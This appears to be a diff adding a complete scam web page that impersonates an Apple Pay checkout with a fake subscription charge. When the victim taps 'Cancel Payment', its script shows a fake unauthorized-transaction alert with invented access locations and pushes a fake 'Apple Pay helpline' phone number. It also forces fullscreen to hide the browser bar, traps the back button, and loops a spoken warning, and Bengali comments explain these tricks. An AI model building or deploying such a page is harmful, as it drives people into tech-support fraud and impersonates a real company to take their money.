@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Pay</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #1d1d1f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 15px;
+            box-sizing: border-box;
+            overflow-x: hidden;
+        }
+        .mobile-container {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-sizing: border-box;
+            min-height: 90vh;
+        }
+        .apple-logo {
+            font-weight: 600;
+            font-size: 13px;
+            color: #86868b;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .pay-to-box {
+            display: flex;
+            align-items: center;
+            background: #fbfbfd;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            padding: 12px 15px;
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .apple-icon {
+            width: 36px;
+            height: 36px;
+            background: #000;
+            border-radius: 8px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: bold;
+        }
+        .total-due {
+            margin: 10px 0;
+            text-align: center;
+        }
+        .total-due p {
+            margin: 0;
+            color: #86868b;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .total-due h1 {
+            margin: 4px 0 0;
+            font-size: 32px;
+            font-weight: 700;
+        }
+        .item-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #e5e5ea;
+            font-size: 14px;
+            text-align: left;
+        }
+        .payment-method {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #fbfbfd;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            padding: 12px 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
+        .action-btn {
+            background-color: #1d1d1f;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .action-btn:hover {
+            background-color: #333333;
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        /* Alert Popup View (Fullscreen direct style) */
+        .alert-content {
+            text-align: center;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+            background: #ffffff;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+        .warning-icon {
+            font-size: 42px;
+            color: #ff9500;
+            margin-bottom: 5px;
+            line-height: 1;
+        }
+        .error-box {
+            background: #fff5f5;
+            border: 1px solid #ffd8d8;
+            border-radius: 10px;
+            padding: 10px 12px;
+            text-align: left;
+            font-size: 12px;
+            color: #c53030;
+            margin: 12px 0;
+        }
+        .device-box {
+            background: #19191c;
+            color: #fff;
+            border-radius: 10px;
+            padding: 12px;
+            text-align: left;
+            font-size: 12px;
+            margin-bottom: 12px;
+        }
+        .device-header {
+            color: #ff453a;
+            font-weight: bold;
+            font-size: 10px;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+        .location-tag {
+            background: #2c2c2e;
+            color: #ff453a;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            display: inline-block;
+            margin: 2px 1px;
+        }
+        .helpline-box {
+            background: #eef3fc;
+            border: 1px solid #d0e1fd;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 12px;
+        }
+        .helpline-number {
+            color: #0071e3;
+            font-size: 18px;
+            font-weight: 700;
+            margin: 3px 0;
+        }
+        .dismiss-btn {
+            background: none;
+            border: none;
+            color: #ff3b30;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            padding: 8px;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container" id="phone-frame">
+        <!-- Main Payment View -->
+        <div id="main-view" style="display: flex; flex-direction: column; height: 100%; justify-content: space-between;">
+            <div>
+                <div class="apple-logo">apple.com ·  Apple Pay</div>
+                
+                <div class="pay-to-box">
+                    <div class="apple-icon"></div>
+                    <div>
+                        <div style="font-size: 11px; color: #86868b;">PAY TO</div>
+                        <div style="font-weight: 600; font-size: 15px;">Apple Inc.</div>
+                        <div style="font-size: 11px; color: #86868b;">One Apple Park Way, Cupertino, CA</div>
+                    </div>
+                </div>
+
+                <div class="total-due">
+                    <p>Total Due</p>
+                    <h1>$249.57</h1>
+                    <p style="font-size: 11px; margin-top: 3px;">Thursday, October 22, 2026</p>
+                </div>
+
+                <div style="text-align: left; margin-top: 10px;">
+                    <div class="item-row">
+                        <div>
+                            <div>Apple One Individual</div>
+                            <div style="font-size: 11px; color: #86868b;">Annual subscription</div>
+                        </div>
+                        <div style="font-weight: 600;">$239.40</div>
+                    </div>
+                    <div class="item-row" style="border-bottom: none;">
+                        <div>
+                            <div>Sales Tax (4.25%)</div>
+                        </div>
+                        <div style="font-weight: 600;">$10.17</div>
+                    </div>
+                </div>
+
+                <div class="payment-method">
+                    <div>
+                        <div style="font-weight: 600; font-size: 13px;">Card linked with Checking account</div>
+                        <div style="font-size: 11px; color: #86868b;">Default payment method</div>
+                    </div>
+                    <div style="color: #86868b;">›</div>
+                </div>
+            </div>
+
+            <div>
+                <button class="action-btn" onclick="cancelPayment()">✕ Cancel Payment</button>
+                <div style="margin-top: 12px; font-size: 11px; color: #86868b; text-align: center;">
+                    Secured with Face ID · Touch ID · Passcode
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Alert Popup View (Fullscreen Direct Mode) -->
+        <div class="hidden alert-content" id="alert-view">
+            <div>
+                <div class="warning-icon">⚠️</div>
+                <div class="apple-logo" style="margin-bottom: 5px;"> Apple Pay</div>
+                <div style="color: #ff3b30; font-weight: 600; font-size: 13px; margin-bottom: 10px;">⚠️ Payment Authorization Failed</div>
+                
+                <div class="error-box">
+                    <div style="margin-bottom: 3px;"><strong>Unauthorized transaction detected</strong> on your Apple ID for <strong>$249.57</strong>.</div>
+                    <div>If you did not initiate this charge, <strong>contact Apple Support immediately</strong>.</div>
+                </div>
+
+                <div class="device-box">
+                    <div class="device-header">🔴 ACCESS DETECTED FROM</div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 6px;">
+                        <span>Device</span>
+                        <span style="font-weight: 600;">Mobile Device</span>
+                    </div>
+                    <div>
+                        <div style="margin-bottom: 3px;">Locations</div>
+                        <div>
+                            <span class="location-tag">📍 Texas, US</span>
+                            <span class="location-tag">📍 Ohio, US</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="helpline-box">
+                    <div style="font-size: 10px; color: #555; font-weight: 600;"> APPLEPAY HELPLINE</div>
+                    <div class="helpline-number">+1 (803) 238-5450</div>
+                    <div style="font-size: 10px; color: #666;">Tap "Call Support Now" to connect</div>
+                </div>
+            </div>
+
+            <div>
+                <a href="tel:+18032385450" class="action-btn" style="background-color: #0071e3; padding: 12px; font-size: 14px;" onclick="stopVoice()">📞 Call Support Now</a>
+                <button class="dismiss-btn" id="dismiss-button" onclick="resetPage()">Dismiss</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let isAlertActive = false;
+
+        function speakAlert() {
+            if (!isAlertActive) return;
+            
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                
+                let textToSpeak = "Warning! Payment authorization failed. Unauthorized transaction detected on your Apple ID for 249 dollars and 57 cents. Please contact Apple Support immediately.";
+                let utterance = new SpeechSynthesisUtterance(textToSpeak);
+                utterance.rate = 1.0;
+                utterance.pitch = 1.2;
+
+                let voices = window.speechSynthesis.getVoices();
+                let femaleVoice = voices.find(v => v.name.includes('Female') || v.name.includes('Zira') || v.name.includes('Google UK English Female') || v.name.includes('Samantha'));
+                if (femaleVoice) {
+                    utterance.voice = femaleVoice;
+                }
+
+                utterance.onend = function() {
+                    if (isAlertActive) {
+                        speakAlert();
+                    }
+                };
+
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        function cancelPayment() {
+            isAlertActive = true;
+            
+            // মেইন ভিউ হাইড করে অ্যালার্ট ভিউ ওপেন করা
+            document.getElementById('main-view').classList.add('hidden');
+            let alertView = document.getElementById('alert-view');
+            alertView.classList.remove('hidden');
+            
+            // ব্রাউজারকে ডাইরেক্ট ফুল-স্ক্রিন মোডে নিয়ে যাওয়া (যাতে ওপরের ট্যাব বা ব্রাউজার বার ঢেকে যায়)
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {});
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            }
+
+            // ব্যাক বাটন ও নেভিগেশন লক করা
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+
+            speakAlert();
+        }
+
+        function stopVoice() {
+            isAlertActive = false;
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+            }
+        }
+
+        function resetPage() {
+            stopVoice();
+            
+            // ফুলস্ক্রিন থেকে বের হয়ে আসা
+            if (document.exitFullscreen) {
+                document.exitFullscreen().catch(err => {});
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
+
+            window.onpopstate = null;
+
+            document.getElementById('alert-view').classList.add('hidden');
+            document.getElementById('main-view').classList.remove('hidden');
+        }
+
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.onvoiceschanged = function() {
+                window.speechSynthesis.getVoices();
+            };
+        }
+    </script>
+
+</body>
+</html>
